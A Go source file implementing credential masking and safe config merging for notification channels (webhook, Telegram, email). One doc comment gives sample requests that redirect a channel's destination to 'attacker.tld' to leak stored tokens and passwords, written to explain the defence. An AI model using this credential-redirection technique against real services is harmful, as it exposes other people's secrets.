package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks masked values. API responses replace credentials with prefixed values; updates interpret them as keeping the stored value unchanged.
//
// A prefix rather than an empty or fixed string can carry identifying information (see MaskedValue), letting users recognize their bot without pasting credentials again.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__": original too short; no identifying hint
//	"__masked__:...ab12cd": include the final six characters
//
// Only the last six characters are exposed deliberately. Webhook identity lives in suffixes such as WeCom keys or Feishu bot IDs; prefixes are shared and uninformative. Six suffix characters cannot reconstruct credentials but let users recognize their group.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked, meaning an API-echoed value left unchanged.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig copies configuration and masks channel credential fields. Unknown channel types return an empty map, preferring an unavailable configuration in the UI over potentially disclosing raw credentials. Non-secret fields remain unchanged for display.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Treat nested structures such as headers as one credential. Per-key classification would require extra rules from every channel, adding more complexity than value.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means the destination changed without explicit credential input. Return it rather than silently allowing or discarding credentials; see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Changed destination keys
	Missing []string // Credential keys without explicit input
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") changed; provide credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter new values, or explicitly leave empty if credentials are no longer required. " +
		"Existing credentials are valid only for the old destination; reusing them would disclose them to the new destination."
}

// PrepareConfigUpdate merges channel configuration and handles security-sensitive destination changes.
//
// It replaces bare MergeConfig on channel updates. Destinations and credentials are independent fields; MergeConfig retains unspecified values. Someone able to PATCH only a destination could therefore send stored credentials to a controlled endpoint:
//
//	webhook {config:{url:"https://attacker.tld"}} sends the original Authorization header
//	telegram {config:{base_url:"https://attacker.tld"}} sends /bot<realToken>/sendMessage
//	email {config:{host:"smtp.attacker.tld"}} discloses username/password after STARTTLS
//
// This silent path needs no redirects, bypasses cross-host redirect restrictions, and defeats the masking goal of not revealing credentials to the browser.
//
// Whenever any destination key changes, callers must explicitly address every credential key: a new value replaces it; an explicit empty string clears it; returning a mask or omitting the key is rejected. A mask means reuse the old credential, which is valid only for the old destination.
//
// Do not silently discard credentials: optional webhook headers or email passwords would lose authentication while still returning 200, harder to diagnose than an error. Require explicit operator input instead.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// Reject mask literals nested in non-string credential values such as headers objects. MergeConfig recognizes only whole prefixed strings as masks; a nested "__masked__" would be stored as a real value and silently break authentication.
	//
	// Check before any early return for unchanged destinations. Placing it later only covers destination changes, a bug caught in the first implementation's tests.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find genuinely changed destination keys; masked values mean unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: merge normally, retaining masked values, clearing empty strings, and replacing others.
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require explicit input for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects mask sentinels inside non-string structures. The masking contract requires the entire value to be a string. Object fields such as webhook headers must be masked as a whole ("__masked__") or submitted in full. A nested sentinel cannot mean unchanged and would be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains mask marker %q: omit the entire field to retain its value, or submit a complete new value; do not embed masked placeholders inside structures",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares configuration values through JSON to normalize type differences, such as frontend numbers versus stored float64 ports, which direct equality could misclassify.
//
// Normalize blanks first: empty strings and missing keys are equivalent because MergeConfig treats empty strings as explicit deletion. Otherwise an optional destination left blank (Telegram base_url, meaning the official endpoint) follows this failure path: creation stores base_url:""; the first save deletes it; the second compares incoming "" to a missing key and falsely detects a changed destination; masked credentials then cause a 400 requiring new credentials. Every later save fails until the user pastes the bot token again despite changing nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue detects empty configuration values. Match MergeConfig's strings.TrimSpace(s) == "" rule so merge deletion and value comparison cannot disagree.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming values into stored channel configuration:
//
//	masked incoming values retain stored values;
//	empty strings explicitly clear/delete keys;
//	other values replace stored values;
//	keys absent from incoming retain stored values (partial update).
//
// Empty-string semantics must be explicit because forms submit unfilled fields as empty strings. Treating them as values could clear fields intended to retain previous values. Here empty means explicit clearing, since users otherwise cannot clear an incorrect field. Omission and an empty value are distinguishable, but the UI does not use that distinction.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value means unchanged; retain stored value
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
